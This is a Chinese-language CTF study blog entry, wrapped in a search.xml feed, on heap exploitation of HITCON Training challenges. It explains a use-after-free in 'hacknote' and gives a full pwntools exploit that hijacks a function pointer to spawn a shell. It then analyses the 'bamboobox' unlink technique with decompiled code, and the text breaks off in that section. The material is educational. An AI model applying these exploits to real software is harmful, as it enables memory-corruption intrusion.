<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>堆学习记录</title>
      <link href="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/"/>
      <url>/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<p>大部分题目都选自HITCON Training</p><h1 id="UAF漏洞-use-after-free"><a href="#UAF漏洞-use-after-free" class="headerlink" title="UAF漏洞(use after free)"></a>UAF漏洞(use after free)</h1><p>顾名思义，UAF漏洞的意思就是在chunk被free之后依然能够使用，产生的原因在于使用过堆块之后没有及时将堆块的指针置null，导致下次申请内存的时候依然能狗使用该堆块</p><p>看到题目</p><h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><p>先checksec走一波<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/1.jpg" alt=""><br>32位文件，只开了nx和canary，partial RELRO意味着got表可改<br>运行一下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/2.jpg" alt=""><br>增删查功能<br>接着IDA分析<br>先看到add功能<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/3.jpg" alt=""><br>首先malloc一个8字节(实际上是分配了16字节，chunk头两个4字节，加上分配的八字节一共16个字节)<br>这16个字节的地址存在notelist这个数组中<br>接着，在这16个字节处，前八个字节是chunk头，接下来的8个字节存入<code>print_note_content</code>函数指针，这个函数的功能是打印<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/4.jpg" alt=""><br>后八个字节存入我们申请的size大小的内存的地址</p><pre class=" language-c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> print_note_contentv0 <span class="token operator">=</span> notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>v0<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>因此，整个note的结构就是这样</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> note <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>printnote<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>content <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>再看到print函数<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/5.jpg" alt=""><br>先输入序号，判断序号是否符合，如果符合的话，再判断<code>notelist[v1]</code>是否存在，存在的话就调用<code>printnote()</code>函数打印</p><p>再看到delete函数<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/6.jpg" alt=""></p><pre class=" language-c"><code class="language-c"><span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>free并不彻底，指针并未置null，这就是漏洞所在</p><p>写exp之前，我们先封装好要用到的几个函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Note size :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>题目中给了一个magic函数<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/8.jpg" alt=""><br>省去了我们泄露libc基地址以及构造shell的功夫<br>那么，该怎么利用这个函数<br>结合uaf漏洞，我们可以将printnote中调用的print_note_content函数替换为magic函数，这样当我们调用printnote函数时，实际上就是调用了magic函数<br>开始构造</p><p>首先malloc两个堆，大小不要等于note结构体的大小</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0号</span>add<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token string">"bbbb"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1号</span></code></pre><p>然后再free掉这两个堆，实际上则是free掉了4个堆，两个note结构体，两个content部分<br>note结构体的大小位于0x10的fastbin，而conten部分位于0x18处</p><pre class=" language-python"><code class="language-python">dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/9.jpg" alt=""><br>接下来我们再malloc一个大小为8的堆(2号堆)，并且将其content赋值为magic的地址，根据fastbin后进先出的原则,2号堆的note结构体就位于1号堆的note结构体处，content则位于0号堆的note结构体位置</p><pre><code>               ——————————————————————————————————               |                                |               |         content2(原note0)      |               |                                |               |--------------------------------|               |                                |               |         content0(freed)        |               |                                |               |--------------------------------|               |                                |               |         note2(原note1)         |               |                                |               |--------------------------------|               |                                |               |         content0(freed)        |               |                                |               ——————————————————————————————————</code></pre><p>我们看看此时的堆结构<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/10.jpg" alt=""><br>可以看到，原本note0中的print_note_content函数指针已经被替换成了magic函数地址，只要我们printnote(0)，就相当于调用了magic函数，即可getshell<br>完整exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token comment" spellcheck="true">#io=remote("node3.buuoj.cn",29741)</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'hacknote'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Note size :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>magic <span class="token operator">=</span> <span class="token number">0x08048945</span>add<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token string">"bbbb"</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>magic<span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><h2 id="bamboobox"><a href="#bamboobox" class="headerlink" title="bamboobox"></a>bamboobox</h2><p>就不细说unlink的原理了，网上有很多师傅的博客可以看，直接说利用方法<br>伪造一个fakechunk0，使fakechunk0的fd指针为<code>&amp;ptr-0x18</code>,使其bk为<code>&amp;ptr-0x10</code>,并通过堆溢出使相邻的下一个堆chunk1认为上一个堆是空闲状态。构造好之后，再free掉chunk1，根据unlink原理，fakechunk也会一起被free掉，攻击效果是ptr最终指向了<code>&amp;ptr-0x18</code>处</p><p>checksec<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/11.jpg" alt=""><br>64位，只开启了canary和nx，我们可以复写got表<br>运行一下，查看功能<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/12.jpg" alt=""><br>增删查改，功能齐了<br>IDA分析 </p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//main</span><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  _QWORD <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-18h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span>v3 <span class="token operator">=</span> hello_message<span class="token punctuation">;</span>  v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> goodbye_message<span class="token punctuation">;</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">signed</span> __int64<span class="token punctuation">,</span> _QWORD<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span>v3<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">16LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token function">show_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token function">add_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token function">change_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token function">remove_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invaild choice!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>main函数里面会先malloc一个0x10大小(实际上0x20)的chunk用来存放两个函数的指针，这没啥用<br>然后通过switch选择功能</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//add_item</span><span class="token keyword">if</span> <span class="token punctuation">(</span> num <span class="token operator">></span> <span class="token number">99</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"the box is full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the length of item name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v2 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v2 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invaild length"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">99</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the name of item:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token operator">++</span>num<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span></code></pre><p>不得不说伪代码看的还是相当让人头大的<br>最大能add100次，有一个itemlist结构体，结构如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> item<span class="token punctuation">{</span>    <span class="token keyword">int</span> size <span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>name <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>为了防止以后遗忘仔细记录一次<br>int是4个字节</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span></code></pre><p>这一句判断判断的是item结构体中name指针是否存在，那么name指针的位置又是怎么确定的，结合题目说明一下</p><pre class=" language-bash"><code class="language-bash">0x6020c0 <span class="token operator">&lt;</span>itemlist<span class="token operator">></span>:    0x0000000000000018  0x00000000006030300x6020d0 <span class="token operator">&lt;</span>itemlist+16<span class="token operator">></span>: 0x0000000000000018  0x00000000006030500x6020e0 <span class="token operator">&lt;</span>itemlist+32<span class="token operator">></span>: 0x0000000000000000  0x00000000000000000x6020f0 <span class="token operator">&lt;</span>itemlist+48<span class="token operator">></span>: 0x0000000000000000  0x00000000000000000x602100 <span class="token operator">&lt;</span>itemlist+64<span class="token operator">></span>: 0x0000000000000000  0x0000000000000000</code></pre><p>64位程序，这么一行就是16个字节，相当于4个int,假设i=0<br>那么，itemlist[i]就是<code>00000018</code>这四个字节，itemlist[i+1]就是<code>00000018</code>前方的<code>00000000</code>这四个字节，相应的，itemlist[i+2]就是<code>00603030</code>这四个字节，对应的就是name指针</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//show_item</span><span class="token keyword">int</span> <span class="token function">show_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>num <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No item in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">99</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d : %s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span>byte_401089<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>show功能根据num索引寻找对应的chunk，然后输出对的chunk编号和内容</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//change</span><span class="token keyword">if</span> <span class="token punctuation">(</span> num <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the index of item:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v2 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the length of item name:"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nptr<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v0 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the new name of the item:"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invaild index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token 